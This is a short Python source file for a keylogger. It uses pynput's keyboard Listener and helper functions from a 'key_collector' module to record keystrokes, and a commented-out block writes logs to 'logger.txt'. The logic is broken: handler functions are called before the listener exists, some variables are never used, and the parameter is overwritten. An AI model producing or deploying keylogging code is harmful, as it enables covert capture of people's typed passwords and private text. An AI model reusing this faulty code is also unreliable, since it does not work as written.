from key_collector import *
from pynput.keyboard import Listener

def KeyLogger(listener):
    pressed= []
    logs = {}
    on_press(listener)
    write_file(pressed)
    # with open('logger.txt', 'a') as f:
        # f.write(logs)
    on_release(listener)
    with Listener(on_press,on_release) as listener:
        listener.join()